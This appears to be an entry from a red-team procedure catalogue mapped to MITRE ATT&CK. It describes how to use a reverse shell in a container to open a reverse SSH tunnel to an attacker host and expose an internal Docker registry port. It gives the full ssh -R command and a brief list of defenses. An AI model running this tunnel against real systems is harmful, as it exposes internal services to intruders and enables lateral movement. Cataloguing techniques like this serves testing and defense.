---
id: proc-ssh-tunnel-container
tags:
  - ssh
  - tunnel
  - lateral-movement
type: procedure
tools:
  - '[[tools/SSH]]'
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/ssh-remote-forward]]'
verified: false
platforms:
  - Linux
  - Docker
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Protocol Tunneling]]'
updated_at: '2025-12-14T17:32:57.740Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Protocol Tunneling]]'
---
---
# Establish-SSH-Tunnel-from-Container

## Summary

This procedure uses the reverse shell in the LGTM container to create a remote SSH tunnel, forwarding the internal Docker Registry port (172.17.0.1:5000) to the attacker's machine.

## Description

From the container's shell, SSH connects to the attacker's server and sets up a reverse port forward (-R), exposing the host's registry service externally via localhost:5555. This bypasses direct access restrictions and persists beyond shell loss.

## Requirements

1. Active reverse shell in container
2. SSH server running on attacker's host with key/password auth
3. SSH client available in container (common in build envs)

## Defense

Defensive measures and detection strategies:

- Block SSH from internal containers to external hosts
- Monitor SSH logs for unauthorized forwards
- Use bastion hosts or VPN for tunnel controls

## Objectives

1. Expose internal registry externally
2. Enable remote access to port 5000
3. Create persistent bridge for exploitation

## Instructions

### Step 1: Execute SSH Forward Command

**Context**: Run the tunnel command from the container shell to map ports.

**Command** ([[commands/ssh-remote-forward]]):
```bash
ssh -R 5555:172.17.0.1:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N
```

> -R forwards attacker's 5555 to container's view of host 5000; -f backgrounds; -N no command. Expected: PID of background process.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Protocol Tunneling]] Protocol Tunneling

### Sub-Techniques


## Commands Used

- [[commands/ssh-remote-forward]]

## Tools Used

- [[tools/SSH]]

## Tags

- ssh
- tunnel

---
